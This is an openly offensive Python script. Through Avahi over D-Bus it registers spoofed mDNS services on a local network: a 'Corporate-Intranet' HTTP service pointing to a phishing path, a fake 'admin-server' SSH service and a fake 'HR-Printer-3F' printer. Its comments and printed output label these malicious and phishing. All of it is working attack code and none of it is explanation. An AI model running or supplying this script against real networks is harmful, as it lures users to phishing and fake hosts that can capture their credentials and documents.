#!/usr/bin/env python3
import dbus
bus = dbus.SystemBus()

# Register malicious mDNS services
server = bus.get_object("org.freedesktop.Avahi", "/")
server_iface = dbus.Interface(server, "org.freedesktop.Avahi.Server")
group_path = server_iface.EntryGroupNew()
group = bus.get_object("org.freedesktop.Avahi", group_path)
group_iface = dbus.Interface(group, "org.freedesktop.Avahi.EntryGroup")

# Phishing HTTP service
group_iface.AddService(-1, -1, 0, "Corporate-Intranet", "_http._tcp", "", "", 8080,
    dbus.Array([b"path=/phishing"], signature="ay"))

# Fake SSH
group_iface.AddService(-1, -1, 0, "admin-server", "_ssh._tcp", "", "", 22,
    dbus.Array([], signature="ay"))

# Fake printer
group_iface.AddService(-1, -1, 0, "HR-Printer-3F", "_ipp._tcp", "", "", 631,
    dbus.Array([b"rp=printers/evil"], signature="ay"))

group_iface.Commit()
print("Malicious mDNS services registered:")
print("  - Corporate-Intranet._http._tcp:8080 (phishing)")
print("  - admin-server._ssh._tcp:22 (fake SSH honeypot)")
print("  - HR-Printer-3F._ipp._tcp:631 (fake printer)")

# Verify
import time
time.sleep(1)

# Browse services
sb = bus.get_object("org.freedesktop.Avahi", "/")
sb_iface = dbus.Interface(sb, "org.freedesktop.Avahi.Server")
hostname = sb_iface.GetHostName()
print(f"\nRegistered on host: {hostname}")
print(f"EntryGroup state: {group_iface.GetState()}")
